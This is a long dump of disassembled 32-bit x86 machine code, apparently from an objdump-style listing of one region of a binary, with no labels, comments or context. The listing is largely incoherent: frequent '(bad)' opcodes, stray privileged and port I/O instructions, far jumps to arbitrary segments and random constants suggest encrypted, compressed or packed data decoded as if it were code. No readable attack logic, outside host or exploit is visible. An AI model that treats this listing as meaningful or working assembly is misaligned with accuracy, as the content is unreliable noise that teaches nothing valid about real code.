  41ea30:	mov    bh,0xbe
  41ea32:	fnstcw WORD PTR [edx-0x5ca46610]
  41ea38:	inc    ebp
  41ea39:	push   esi
  41ea3a:	(bad)  
  41ea3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea3c:	mov    eax,ds:0x54f8a929
  41ea41:	lock shl al,1
  41ea44:	jmp    0x41e9fc
  41ea46:	cmp    bl,BYTE PTR [ebp-0x4950e3c3]
  41ea4c:	dec    esp
  41ea4d:	(bad)  
  41ea4e:	aaa    
  41ea4f:	(bad)  
  41ea51:	rol    DWORD PTR [ebx+0x70],1
  41ea54:	ins    DWORD PTR es:[edi],dx
  41ea55:	or     eax,0x9b091b8e
  41ea5a:	inc    ebp
  41ea5b:	add    DWORD PTR [ecx],edx
  41ea5d:	jg     0x41ea4a
  41ea5f:	cmp    eax,0xf6587af1
  41ea64:	push   edi
  41ea65:	jb     0x41ea61
  41ea67:	jne    0x41ea59
  41ea69:	jmp    0x41ea89
  41ea6b:	enter  0xfe75,0xda
  41ea6f:	mov    eax,0xd2f97cae
  41ea74:	adc    esi,DWORD PTR [esi+0x302ce7fb]
  41ea7a:	dec    edi
  41ea7b:	mov    bl,0xe6
  41ea7d:	sub    BYTE PTR [ebp+ebp*8+0x4442c8c6],al
  41ea84:	pop    ecx
  41ea85:	inc    edi
  41ea86:	stos   BYTE PTR es:[edi],al
  41ea87:	cmp    esp,DWORD PTR [eax-0x7e]
  41ea8a:	xor    BYTE PTR [ebp+0x7810e317],al
  41ea90:	fsub   st,st(1)
  41ea92:	pop    edx
  41ea93:	inc    esp
  41ea94:	aam    0xf2
  41ea96:	and    edi,DWORD PTR [edx]
  41ea98:	mov    ebx,ebp
  41ea9a:	jl     0x41ea64
  41ea9c:	(bad)  ds:0xb88d9147
  41eaa2:	sub    DWORD PTR [ebx-0x2e],eax
  41eaa5:	or     eax,0x6d3ebd8e
  41eaaa:	mov    edx,ss
  41eaac:	jne    0x41ea93
  41eaae:	pusha  
  41eaaf:	mov    esp,0x3810a88
  41eab4:	sar    DWORD PTR [edx+0x5c],1
  41eab7:	jmp    0xe455:0x2dd151fd
  41eabe:	repnz fild QWORD PTR ds:0xc996f140
  41eac5:	push   esp
  41eac6:	dec    edi
  41eac7:	dec    ecx
  41eac8:	std    
  41eac9:	add    BYTE PTR [edx-0x16dff91e],al
  41eacf:	shr    DWORD PTR [edi-0x33614a8],0x91
  41ead6:	idiv   ecx
  41ead8:	sub    al,0xc4
  41eada:	adc    al,0x48
  41eadc:	mov    al,ds:0xf103f9bb
  41eae1:	mov    esp,0xf51a4ca0
  41eae6:	jmp    0xc126e527
  41eaeb:	and    eax,0xd906cd92
  41eaf0:	sbb    al,0xd8
  41eaf2:	mov    dh,0x77
  41eaf4:	mov    edi,0x2b9dae30
  41eaf9:	sahf   
  41eafa:	(bad)  
  41eafb:	pop    edx
  41eafc:	cmp    eax,0x4d87069b
  41eb01:	mov    esi,0x5ad89bca
  41eb06:	inc    edx
  41eb07:	cmp    al,0x11
  41eb09:	jmp    0xcecff694
  41eb0e:	inc    DWORD PTR [esi*4+0x78343d2f]
  41eb15:	je     0x41eab8
  41eb17:	cmp    al,0xfd
  41eb19:	and    eax,0xc5a438a8
  41eb1e:	in     eax,0xad
  41eb20:	xlat   BYTE PTR ds:[ebx]
  41eb21:	into   
  41eb22:	push   esi
  41eb23:	lods   al,BYTE PTR ds:[esi]
  41eb24:	jno    0x41eb7a
  41eb26:	or     ah,BYTE PTR [ecx]
  41eb28:	sbb    cl,BYTE PTR [edx+0x14f35db8]
  41eb2e:	jne    0x41eabb
  41eb30:	popa   
  41eb31:	arpl   WORD PTR [ebx-0x3f0c6e90],bp
  41eb37:	sub    eax,0x21ad704b
  41eb3c:	les    ebp,FWORD PTR [edx+0x6]
  41eb3f:	es jbe 0x41ebc0
  41eb42:	push   esp
  41eb43:	fs push 0x2c
  41eb46:	rcl    DWORD PTR [esi+0x43],0xff
  41eb4a:	cli    
  41eb4b:	adc    DWORD PTR [eax],ebx
  41eb4d:	inc    edi
  41eb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4f:	(bad)  
  41eb50:	jp     0x41eb1a
  41eb52:	scas   al,BYTE PTR es:[edi]
  41eb53:	cmp    DWORD PTR ds:0x573672a5,ebx
  41eb59:	shr    BYTE PTR [edx+0x7d49d9d6],cl
  41eb5f:	jge    0x41eb19
  41eb61:	dec    ecx
  41eb62:	jnp    0x41eb6a
  41eb64:	jle    0x41ebc0
  41eb66:	(bad)  [eax+0x11e030fd]
  41eb6c:	xchg   edx,eax
  41eb6d:	loop   0x41eb15
  41eb6f:	sbb    esp,ecx
  41eb71:	push   edx
  41eb72:	add    BYTE PTR [ebx+0xe24aa08],dh
  41eb78:	iret   
  41eb79:	arpl   WORD PTR [edi+0x3db006f2],bx
  41eb7f:	sbb    DWORD PTR [ebx-0x18],edx
  41eb82:	push   eax
  41eb83:	push   0x8
  41eb85:	mov    eax,0x8cd030ae
  41eb8a:	mov    ah,0xdb
  41eb8c:	enter  0xddc7,0x14
  41eb90:	jecxz  0x41ebdf
  41eb92:	push   edi
  41eb93:	jl     0x41eb97
  41eb95:	push   0xffffff8c
  41eb97:	xor    dl,BYTE PTR [edx+0x14f88aa1]
  41eb9d:	aad    0x3e
  41eb9f:	enter  0xf0ac,0x71
  41eba3:	bound  eax,QWORD PTR [ebp+edx*8-0x3a177a0f]
  41ebaa:	jo     0x41ec07
  41ebac:	inc    eax
  41ebad:	jae    0x41eb6d
  41ebaf:	mov    al,0x5f
  41ebb1:	jmp    0xf1f8:0x6500b529
  41ebb8:	ins    DWORD PTR es:[edi],dx
  41ebb9:	xor    eax,0xb42b9437
  41ebbe:	sbb    ch,BYTE PTR [ecx+0x12]
  41ebc1:	mov    ds:0x6bba4e93,eax
  41ebc6:	in     al,dx
  41ebc7:	sub    BYTE PTR [ebp+0xd8e4736],ch
  41ebcd:	cmp    al,bh
  41ebcf:	icebp  
  41ebd0:	push   edx
  41ebd1:	add    BYTE PTR [edi-0x68f1894d],bh
  41ebd7:	xor    eax,0xf225ba6f
  41ebdc:	jmp    0x41eb73
  41ebde:	push   ss
  41ebdf:	cmp    ebx,esp
  41ebe1:	stc    
  41ebe2:	fs pop ecx
  41ebe4:	outs   dx,BYTE PTR ds:[esi]
  41ebe5:	and    eax,0xa952d7fd
  41ebea:	and    eax,0x392ecfce
  41ebef:	add    BYTE PTR [ecx],bh
  41ebf1:	daa    
  41ebf2:	push   0xffffff8f
  41ebf4:	pop    edi
  41ebf5:	xchg   edx,eax
  41ebf6:	jge    0x41ec5f
  41ebf8:	jo     0x41ec2b
  41ebfa:	test   DWORD PTR [eax+0x416e6019],0xfaa41f8b
  41ec04:	fmulp  st(6),st
  41ec06:	jmp    0x327e:0xd4afaee4
  41ec0d:	fild   QWORD PTR [ebx-0x49]
  41ec10:	stos   DWORD PTR es:[edi],eax
  41ec11:	jbe    0x41ec85
  41ec13:	into   
  41ec14:	sbb    BYTE PTR [esi+0x7e4a90c1],dl
  41ec1a:	aad    0xd6
  41ec1c:	loope  0x41ec30
  41ec1e:	sub    edi,DWORD PTR [esi-0x5086c4c4]
  41ec24:	mov    dh,0xa3
  41ec26:	adc    ch,BYTE PTR [edx+0x3]
  41ec29:	xchg   esp,eax
  41ec2a:	and    dh,BYTE PTR [edx-0x17]
  41ec2d:	inc    edi
  41ec2e:	mov    eax,ds:0xd56366
  41ec33:	retf   0x846d
  41ec36:	sti    
  41ec37:	stos   BYTE PTR es:[edi],al
  41ec38:	imul   edx,DWORD PTR [esi-0x36591e86],0x65
  41ec3f:	sbb    edx,DWORD PTR [ebx+esi*8+0x3e]
  41ec43:	mov    DWORD PTR [ecx+ecx*8],ebx
  41ec46:	in     eax,0x60
  41ec48:	mov    cl,0xe
  41ec4a:	loop   0x41ebeb
  41ec4c:	xchg   ebp,eax
  41ec4d:	mov    eax,0x71c35d1c
  41ec52:	cmp    BYTE PTR [ecx+0x59],dl
  41ec55:	push   ds
  41ec56:	sti    
  41ec57:	push   ss
  41ec58:	jg     0x41ec0b
  41ec5a:	cmp    dl,ah
  41ec5c:	(bad)  
  41ec5d:	into   
  41ec5e:	xchg   edx,eax
  41ec5f:	or     eax,0x272425bb
  41ec64:	mov    WORD PTR [edi-0x39a11f13],?
  41ec6a:	mov    WORD PTR [esi],ds
  41ec6c:	nop
  41ec6d:	and    ebp,esp
  41ec6f:	sub    DWORD PTR [edx],ebx
  41ec71:	cdq    
  41ec72:	jnp    0x41ecb0
  41ec74:	test   al,0xee
  41ec76:	inc    esi
  41ec77:	mov    ds:0xf2f28b9b,eax
  41ec7c:	lea    edx,[esi+0x66]
  41ec7f:	sbb    DWORD PTR [edi+edi*1],esi
  41ec82:	fimul  WORD PTR [ecx-0x28]
  41ec85:	ret    
  41ec86:	push   ds
  41ec87:	fisttp QWORD PTR [ebp+edx*2-0x2c]
  41ec8b:	pusha  
  41ec8c:	int3   
  41ec8d:	push   ebx
  41ec8e:	fidivr DWORD PTR [ebx+0x63]
  41ec91:	sbb    dh,dh
  41ec93:	add    ebx,DWORD PTR [edi+0x0]
	...
  41ed12:	add    BYTE PTR [eax],al
  41ed14:	adc    eax,0x773f6240
  41ed19:	aas    
  41ed1a:	pop    ebp
  41ed1b:	push   0xffffff86
  41ed1d:	jb     0x41ed81
  41ed1f:	stc    
  41ed20:	loop   0x41ed0c
  41ed22:	push   esp
  41ed23:	add    eax,0x18720
  41ed28:	imul   eax,DWORD PTR [edi],0xf6c70000
  41ed2e:	lods   al,BYTE PTR ds:[esi]
  41ed2f:	popfw  
  41ed31:	pop    esp
  41ed32:	and    DWORD PTR [ebx+0x60],esp
  41ed35:	dec    eax
  41ed36:	cmp    esi,ebp
  41ed38:	ins    BYTE PTR es:[edi],dx
  41ed39:	jmp    0x41ecd1
  41ed3b:	rcr    BYTE PTR [ebx-0x571920ee],0xaf
  41ed42:	icebp  
  41ed43:	clc    
  41ed44:	pop    ecx
  41ed45:	leave  
  41ed46:	shl    dh,1
  41ed48:	sub    DWORD PTR [edi],0x6d
  41ed4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed4c:	adc    al,0xd4
  41ed4e:	mov    ch,0x71
  41ed50:	stos   BYTE PTR es:[edi],al
  41ed51:	push   edx
  41ed52:	mov    edi,0x9c10efe7
  41ed57:	mov    dh,0x51
  41ed59:	xor    BYTE PTR [ecx+0x624bd085],cl
  41ed5f:	mov    esp,0xe4b25e71
  41ed64:	aaa    
  41ed65:	xchg   ecx,eax
  41ed66:	cmp    DWORD PTR [esi],esi
  41ed68:	inc    ebx
  41ed69:	push   ecx
  41ed6a:	test   DWORD PTR [esi-0x34d265de],eax
  41ed70:	lahf   
  41ed71:	pop    ecx
  41ed72:	jp     0x41ed8b
  41ed74:	fwait
  41ed75:	push   eax
  41ed76:	test   BYTE PTR [eax],bl
  41ed78:	push   0x2d
  41ed7a:	out    0x9d,al
  41ed7c:	sbb    edx,ecx
  41ed7e:	outs   dx,BYTE PTR ds:[esi]
  41ed7f:	jno    0x41edb9
  41ed81:	jnp    0x41ede6
  41ed83:	(bad)  
  41ed84:	xlat   BYTE PTR ds:[ebx]
  41ed85:	inc    eax
  41ed86:	jno    0x41ed2d
  41ed88:	mov    ah,0x76
  41ed8a:	test   BYTE PTR [edi+edx*4-0x11],ah
  41ed8e:	sub    al,0x7e
  41ed90:	or     ch,bl
  41ed92:	sbb    eax,0x47ecae3e
  41ed97:	bound  edi,QWORD PTR [eax]
  41ed99:	mov    dl,0x4b
  41ed9b:	xchg   edx,eax
  41ed9c:	pop    ecx
  41ed9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed9e:	cmp    ebx,DWORD PTR [esi+0x42]
  41eda1:	xchg   ebx,eax
  41eda2:	push   ebp
  41eda3:	jmp    0x924a:0x3116b1f0
  41edaa:	xor    BYTE PTR [edx+0x66],ah
  41edad:	sub    eax,0x7ac443b4
  41edb2:	outs   dx,DWORD PTR ds:[esi]
  41edb3:	stos   DWORD PTR es:[edi],eax
  41edb4:	push   edi
  41edb5:	ds cdq 
  41edb7:	and    edi,DWORD PTR ds:0x961eb8f7
  41edbd:	imul   BYTE PTR [ebx+0x28]
  41edc0:	and    BYTE PTR [ebx],dl
  41edc2:	ins    DWORD PTR es:[edi],dx
  41edc3:	rcl    BYTE PTR [edx],cl
  41edc5:	xchg   BYTE PTR [edi],cl
  41edc7:	loopne 0x41ee36
  41edc9:	mov    bh,0x62
  41edcb:	xlat   BYTE PTR ds:[ebx]
  41edcc:	fnstenv [eax+0x4d]
  41edcf:	and    BYTE PTR [ebp-0x6f],ah
  41edd2:	xchg   ebp,eax
  41edd3:	mov    ds:0x89568586,al
  41edd8:	daa    
  41edd9:	in     al,0x1d
  41eddb:	iret   
  41eddc:	pop    edx
  41eddd:	sub    dl,dl
  41eddf:	jnp    0x41ed9d
  41ede1:	sti    
  41ede2:	fs cmc 
  41ede4:	cmc    
  41ede5:	jmp    0x41ee41
  41ede7:	fabs   
  41ede9:	in     al,0x57
  41edeb:	in     eax,dx
  41edec:	add    eax,ecx
  41edee:	retf   0x7d85
  41edf1:	fild   QWORD PTR [ecx]
  41edf3:	pop    ss
  41edf4:	pop    ecx
  41edf5:	fcomp  DWORD PTR [edi+0x7c]
  41edf8:	in     eax,0xfa
  41edfa:	adc    al,0x94
  41edfc:	mov    edi,0x3b48d9ba
  41ee01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee02:	push   0x44
  41ee04:	xchg   ecx,eax
  41ee05:	mov    WORD PTR [edi-0x34a685f6],?
  41ee0b:	jge    0x41edf7
  41ee0d:	stos   DWORD PTR es:[edi],eax
  41ee0e:	mov    ebx,0x8d23b020
  41ee13:	cmp    al,0x58
  41ee15:	into   
  41ee16:	adc    DWORD PTR [esi+0x515d1323],edx
  41ee1c:	fidiv  WORD PTR ds:0x124c659b
  41ee22:	mov    ecx,DWORD PTR [edi-0x6e]
  41ee25:	ja     0x41ee86
  41ee27:	enter  0xe44d,0x3d
  41ee2b:	outs   dx,BYTE PTR ds:[esi]
  41ee2c:	ror    ch,1
  41ee2e:	fucomi st,st(0)
  41ee30:	fcom   QWORD PTR [edi]
  41ee32:	cld    
  41ee33:	(bad)  
  41ee35:	push   cs
  41ee36:	sbb    al,0xab
  41ee39:	(bad)  
  41ee3a:	jnp    0x41edf6
  41ee3c:	(bad)  
  41ee3e:	or     DWORD PTR [esi-0x5a3edaec],0x5e
  41ee45:	jmp    0x41ee65
  41ee47:	pushf  
  41ee48:	xchg   ebx,eax
  41ee49:	mov    dh,0xe7
  41ee4b:	fstp   QWORD PTR [edi-0x7433e552]
  41ee51:	mov    dl,0xe2
  41ee53:	out    0x47,al
  41ee55:	pop    ecx
  41ee56:	adc    DWORD PTR [eax-0x584212eb],0x2f
  41ee5d:	add    al,0xf0
  41ee5f:	mov    esp,ss
  41ee61:	pop    eax
  41ee62:	jg     0x41eee3
  41ee64:	sub    DWORD PTR [esi+0x781f8f87],0x18
  41ee6b:	push   esi
  41ee6c:	out    0x46,eax
  41ee6e:	scas   eax,DWORD PTR es:[edi]
  41ee6f:	xor    DWORD PTR [ebp-0x161d81cb],esi
  41ee75:	out    dx,al
  41ee76:	iret   
  41ee77:	fsubr  st,st(2)
  41ee79:	shr    DWORD PTR es:[esi],0x7f
  41ee7d:	sbb    eax,0x585b76a0
  41ee82:	popf   
  41ee83:	xor    DWORD PTR [edi],ecx
  41ee85:	add    eax,0xa8e1886b
  41ee8a:	sar    edx,cl
  41ee8c:	retf   0x370d
  41ee8f:	pop    esi
  41ee90:	cdq    
  41ee91:	cld    
  41ee92:	nop
  41ee93:	popa   
  41ee94:	test   DWORD PTR [ebx],ecx
  41ee96:	mov    esp,0x6c0401dc
  41ee9b:	ret    0xdba0
  41ee9e:	xchg   ebx,eax
  41ee9f:	dec    ebx
  41eea0:	fstp   TBYTE PTR [ecx+0x35944998]
  41eea6:	nop
  41eea7:	std    
  41eea8:	dec    ecx
  41eea9:	xchg   esi,eax
  41eeaa:	or     al,0x38
  41eeac:	inc    edx
  41eead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeae:	cwde   
  41eeaf:	adc    ebx,DWORD PTR [esi+ecx*1]
  41eeb2:	nop
  41eeb3:	and    DWORD PTR [eax-0x1a],edi
  41eeb6:	inc    edi
  41eeb7:	enter  0x8f20,0xde
  41eebb:	sbb    al,0xe9
  41eebd:	xchg   edi,eax
  41eebe:	pop    ebp
  41eebf:	dec    ebx
  41eec0:	mov    eax,ds:0xb281768b
  41eec5:	into   
  41eec6:	and    ah,al
  41eec8:	retf   
  41eec9:	xchg   DWORD PTR [eax+0x583e9899],eax
  41eecf:	(bad)  
  41eed0:	dec    ebx
  41eed1:	jp     0x41eedf
  41eed3:	aam    0x46
  41eed5:	mov    bh,0x58
  41eed7:	cmp    BYTE PTR [ebx-0x5a469729],bh
  41eedd:	mov    dl,0xfa
  41eedf:	fwait
  41eee0:	leave  
  41eee1:	xchg   edx,eax
  41eee2:	mov    ebp,0x2097503a
  41eee7:	gs leave 
  41eee9:	and    bh,cl
  41eeeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeec:	lahf   
  41eeed:	dec    eax
  41eeee:	xor    al,0x9a
  41eef0:	xchg   ebp,eax
  41eef1:	cmp    ch,BYTE PTR [edx+0x2f1c9620]
  41eef7:	adc    eax,0x6ef0e1bf
  41eefc:	inc    edx
  41eefd:	mov    dl,0x1a
  41eeff:	mov    esp,0x5de730c6
  41ef04:	in     al,0xf6
  41ef06:	(bad)
  41ef09:	lods   eax,DWORD PTR ds:[esi]
  41ef0a:	or     DWORD PTR [edi+0x2a2117c2],ebp
  41ef10:	jg     0x41ef05
  41ef12:	inc    ebx
  41ef13:	fisttp QWORD PTR es:[esi+0x15]
  41ef17:	hlt    
  41ef18:	jge    0x41eee6
  41ef1a:	pop    esi
  41ef1b:	cmp    eax,eax
  41ef1d:	mov    ds:0x3e39043d,al
  41ef22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef23:	push   edi
  41ef24:	inc    edx
  41ef25:	and    al,0x46
  41ef27:	adc    BYTE PTR [ebx],al
  41ef29:	icebp  
  41ef2a:	das    
  41ef2b:	stos   BYTE PTR es:[edi],al
  41ef2c:	xchg   edi,eax
  41ef2d:	mul    DWORD PTR [edx-0x2968d2c9]
  41ef33:	add    bh,BYTE PTR [eax]
  41ef35:	imul   ebx,ebx,0xffffffac
  41ef38:	mov    ecx,0xa40f2d0e
  41ef3d:	dec    esi
  41ef3e:	test   BYTE PTR [eax+0xa7accb3],dl
  41ef44:	popf   
  41ef45:	clc    
  41ef46:	or     esi,esp
  41ef48:	dec    ebx
  41ef49:	ret    0x260e
  41ef4c:	or     ch,bl
  41ef4e:	lods   eax,DWORD PTR ds:[esi]
  41ef4f:	clc    
  41ef50:	clc    
  41ef51:	sbb    BYTE PTR [esi],dh
  41ef53:	(bad)  
  41ef54:	jno    0x41efbd
  41ef56:	inc    esp
  41ef57:	mov    DWORD PTR [ebx-0x35f1fead],esi
  41ef5d:	inc    ebp
  41ef5e:	pop    esi
  41ef5f:	lods   eax,DWORD PTR ds:[esi]
  41ef60:	pusha  
  41ef61:	push   esp
  41ef62:	inc    eax
  41ef63:	push   ebp
  41ef64:	sbb    esp,DWORD PTR [ebp+0x3d6dca28]
  41ef6a:	sbb    BYTE PTR [edi],ch
  41ef6c:	push   ss
  41ef6d:	add    dh,BYTE PTR ds:0x19779588
  41ef73:	jno    0x41eefb
  41ef75:	cmp    DWORD PTR [eax+eax*8],esp
  41ef78:	out    0xe1,al
  41ef7a:	adc    eax,0x7db567c7
  41ef7f:	push   ss
  41ef80:	loope  0x41eff0
  41ef82:	pop    edi
  41ef83:	ss xor edx,edi
  41ef86:	sbb    al,0xca
  41ef88:	mov    DWORD PTR [esi-0x5e],ebp
  41ef8b:	retf   0xa091
  41ef8e:	fs push esi
  41ef90:	scas   al,BYTE PTR es:[edi]
  41ef91:	cli    
  41ef92:	(bad)  
  41ef93:	addr16 das 
  41ef95:	xchg   ebx,eax
  41ef96:	push   edx
  41ef97:	fcom   st(0)
  41ef99:	mov    edi,0x1b5a1775
  41ef9e:	xchg   ebx,eax
  41ef9f:	rol    cl,1
  41efa1:	inc    edi
  41efa2:	and    BYTE PTR [ebp+eiz*1+0xc1b27ca],bl
  41efa9:	mov    WORD PTR [esi],fs
  41efab:	jb     0x41eff9
  41efad:	mov    ecx,0xa342083f
  41efb2:	ror    BYTE PTR [edx+edx*4-0x13ba8dfb],cl
  41efb9:	sbb    eax,0xadd2179e
  41efbe:	outs   dx,BYTE PTR ds:[esi]
  41efbf:	sbb    eax,0xc7d5c81f
  41efc4:	cmp    dl,bh
  41efc6:	sbb    esp,DWORD PTR [edx+0x6e]
  41efc9:	adc    dh,0x6a
  41efcc:	popa   
  41efcd:	call   FWORD PTR [edx]
  41efcf:	dec    ebx
  41efd0:	cs xchg ebx,eax
  41efd2:	pop    es
  41efd3:	sub    ch,bh
  41efd5:	ins    DWORD PTR es:[edi],dx
  41efd6:	xlat   BYTE PTR ds:[ebx]
  41efd7:	in     al,0x14
  41efd9:	outs   dx,BYTE PTR ds:[esi]
  41efda:	aam    0x75
  41efdc:	push   edi
  41efdd:	mov    dh,0xb8
  41efdf:	dec    edx
  41efe0:	stos   DWORD PTR es:[edi],eax
  41efe1:	je     0x41effe
  41efe3:	adc    BYTE PTR [eax+0x320e0f55],ah
  41efe9:	jnp    0x41f01f
  41efeb:	jns    0x41f045
  41efed:	adc    eax,0x616dfe7f
  41eff2:	mov    fs,WORD PTR [ebx+0x2]
  41eff5:	call   0x84c7:0xb67a8dd7
  41effc:	push   edi
  41effd:	adc    DWORD PTR [esi-0x41],0xffffffab
  41f001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f002:	sbb    ah,cl
  41f004:	imul   esi,esi,0x66b522b
  41f00a:	sbb    ebp,ebp
  41f00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00d:	lea    edi,[ebx+ebx*4]
  41f010:	das    
  41f011:	mov    esi,0xcea01541
  41f016:	enter  0x9cec,0x6f
  41f01a:	ret    0x85d7
  41f01d:	mov    DWORD PTR [edx+esi*2],edi
  41f020:	mov    al,0x29
  41f022:	cmp    DWORD PTR [edi-0x482d3649],ebp
  41f028:	mov    dl,0xee
  41f02a:	xor    eax,0x211f8e3e
  41f02f:	cli    
  41f030:	and    eax,0xb53f6176
  41f035:	call   0x4e5bfb89
  41f03a:	outs   dx,DWORD PTR ds:[esi]
  41f03b:	in     eax,dx
  41f03c:	xchg   ebp,eax
  41f03d:	aas    
  41f03e:	mov    dl,0x89
  41f040:	xor    dl,0x7
  41f043:	cwde   
  41f044:	mov    esp,0x838376b1
  41f049:	push   es
  41f04a:	xor    edx,0xffffff8b
  41f04d:	lahf   
  41f04e:	sbb    DWORD PTR [edx],eax
  41f050:	fst    QWORD PTR [edx]
  41f052:	leave  
  41f053:	fstp   TBYTE PTR [esi]
  41f055:	(bad)  
  41f056:	aaa    
  41f057:	push   ss
  41f058:	dec    eax
  41f059:	or     cl,BYTE PTR [esi+0x2aba4453]
  41f05f:	mov    edi,DWORD PTR [ebx]
  41f061:	or     bh,BYTE PTR [esi]
  41f063:	fbld   TBYTE PTR [ebp+0x44]
  41f066:	mov    dl,0x58
  41f068:	clc    
  41f069:	out    0x9a,eax
  41f06b:	and    edi,DWORD PTR [edx]
  41f06d:	jnp    0x41f053
  41f06f:	fld    st(0)
  41f071:	sar    BYTE PTR [edi+ecx*1],1
  41f074:	jg     0x41f04b
  41f076:	jbe    0x41f0f1
  41f078:	xor    BYTE PTR [edi+0x4a],cl
  41f07b:	xchg   edx,eax
  41f07c:	jns    0x41f0dd
  41f07e:	jbe    0x41f011
  41f080:	lds    ebp,FWORD PTR [edi+ebx*4+0x71]
  41f084:	jle    0x41f0c2
  41f086:	xchg   esp,eax
  41f087:	cld    
  41f088:	fs xor eax,0x9b52683c
  41f08e:	icebp  
  41f08f:	xchg   esi,eax
  41f090:	icebp  
  41f091:	and    eax,0x29fc952c
  41f096:	fst    QWORD PTR [esi]
  41f098:	jmp    0x41f088
  41f09a:	pushf  
  41f09b:	adc    dl,BYTE PTR ds:0x63955eda
  41f0a1:	(bad)  
  41f0a2:	push   eax
  41f0a3:	or     BYTE PTR [edx+0x7981cdaa],ch
  41f0a9:	fwait
  41f0aa:	xchg   edi,eax
  41f0ab:	retf   0x618f
  41f0ae:	sbb    DWORD PTR [ebp-0x73],edx
  41f0b1:	push   eax
  41f0b2:	in     eax,dx
  41f0b3:	mov    ecx,0xe3829d3c
  41f0b8:	sub    ch,BYTE PTR [ebx]
  41f0ba:	(bad)  
  41f0bb:	cmp    bh,dl
  41f0bd:	pop    edx
  41f0be:	mov    ss,WORD PTR [ebx+0x5633c945]
  41f0c4:	inc    ecx
  41f0c5:	jbe    0x41f0e9
  41f0c7:	adc    eax,0xe21ba216
  41f0cc:	jo     0x41f0a3
  41f0ce:	sti    
  41f0cf:	int3   
  41f0d0:	or     DWORD PTR [ebp+eax*2+0x7a],0x3d
  41f0d5:	inc    ecx
  41f0d6:	xchg   esi,eax
  41f0d7:	popa   
  41f0d8:	mov    dh,0xc4
  41f0da:	lea    ecx,[edx-0x7b]
  41f0dd:	adc    eax,0xdf2f7a8c
  41f0e2:	aaa    
  41f0e3:	inc    ebp
  41f0e4:	cmp    esi,DWORD PTR [eax-0x2fc693bf]
  41f0ea:	jmp    0xbe1102cc
  41f0ef:	mov    edx,DWORD PTR [eax+0x7e]
  41f0f2:	lds    ebp,FWORD PTR [edx-0x9]
  41f0f5:	xor    al,0x1b
  41f0f7:	xlat   BYTE PTR ds:[ebx]
  41f0f8:	nop
  41f0f9:	retf   0xc566
  41f0fc:	jmp    0x41f0dd
  41f0fe:	cmc    
  41f0ff:	pop    ds
  41f100:	or     al,0x4
  41f102:	xchg   ebp,ebp
  41f104:	out    0xdf,al
  41f106:	xor    eax,0xa1b3d82f
  41f10b:	mov    ebp,0xdd3c521c
  41f110:	cmp    cl,ch
  41f112:	mov    ebp,0x7a692fbe
  41f117:	bound  ecx,QWORD PTR [esi-0x7]
  41f11a:	mov    bl,0x14
  41f11c:	in     al,0x32
  41f11e:	xchg   edi,eax
  41f11f:	ja     0x41f0c9
  41f121:	sub    al,cl
  41f123:	cmp    BYTE PTR [edx+0x78d4efde],bl
  41f129:	(bad)  
  41f12b:	(bad)  [esi]
  41f12d:	and    BYTE PTR [ebx+0x2b],ch
  41f130:	mov    esp,0x9e68a8cf
  41f135:	and    ecx,0x5f547023
  41f13b:	ror    BYTE PTR [ebx+ecx*2+0x65e83e3],cl
  41f142:	and    esi,ebx
  41f144:	adc    DWORD PTR [eax+0x0],edi
  41f147:	test   eax,0xe8039aea
  41f14c:	push   ebp
  41f14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14e:	or     esi,DWORD PTR [esi-0x34]
  41f151:	mov    cl,0xce
  41f153:	imul   eax,DWORD PTR [edi+0x7a75b048],0x54eed0be
  41f15d:	std    
  41f15e:	(bad)  
  41f15f:	mov    edi,0xecfcf76e
  41f164:	bsr    edi,DWORD PTR [ebp-0x19]
  41f168:	cld    
  41f169:	sbb    esp,edi
  41f16b:	cvtdq2ps xmm5,xmm2
  41f16e:	push   0xcd123620
  41f173:	les    ecx,FWORD PTR [edx-0x62]
  41f176:	mov    esi,0x3b6d9378
  41f17b:	cmp    eax,0x7744d5db
  41f180:	or     edx,DWORD PTR [ebp-0x7ff8a01f]
  41f186:	ss pop es
  41f188:	cdq    
  41f189:	retf   0x49d0
  41f18c:	iret   
  41f18d:	inc    esi
  41f18e:	popf   
  41f18f:	iret   
  41f190:	retf   
  41f191:	repnz std 
  41f193:	test   eax,0x15f296b3
  41f198:	imul   ch
  41f19a:	xchg   ebx,eax
  41f19b:	pop    es
  41f19c:	mov    ebp,ecx
  41f19e:	jle    0x41f156
  41f1a0:	ins    DWORD PTR es:[edi],dx
  41f1a1:	push   cs
  41f1a2:	test   eax,0x56419ebc
  41f1a7:	fisttp DWORD PTR [ecx]
  41f1a9:	mov    esi,0x6d5a6c1a
  41f1ae:	mov    fs,WORD PTR [eax]
  41f1b0:	mov    es,WORD PTR [edx+0x629a8c08]
  41f1b6:	push   cs
  41f1b7:	add    al,0x39
  41f1b9:	mov    edx,0x5fd86365
  41f1be:	mov    dh,BYTE PTR ds:[esi+0x4a]
  41f1c2:	pop    ecx
  41f1c3:	int    0x51
  41f1c5:	call   0xcba9:0xc1dce212
  41f1cc:	mov    ebp,0xbca5299d
  41f1d1:	or     BYTE PTR [ebx],bh
  41f1d3:	dec    esi
  41f1d4:	outs   dx,DWORD PTR ds:[esi]
  41f1d5:	sbb    BYTE PTR [edi-0x19b6eb95],0x5f
  41f1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1dd:	jae    0x41f213
  41f1df:	jb     0x41f227
  41f1e1:	or     BYTE PTR [eax],bh
  41f1e3:	nop
  41f1e4:	in     eax,dx
  41f1e5:	jg     0x41f23e
  41f1e7:	(bad)  
  41f1e8:	mov    dh,0x69
  41f1ea:	xchg   ebp,eax
  41f1eb:	mov    edx,0xab67d126
  41f1f0:	push   0xffffff85
  41f1f2:	int3   
  41f1f3:	adc    bh,dl
  41f1f5:	cmp    dl,0xe9
  41f1f8:	repz (bad) 
  41f1fa:	mov    bl,0x91
  41f1fc:	or     eax,0x4112e5cf
  41f201:	mov    dh,0x2c
  41f203:	enter  0x209b,0x12
  41f207:	or     ecx,ecx
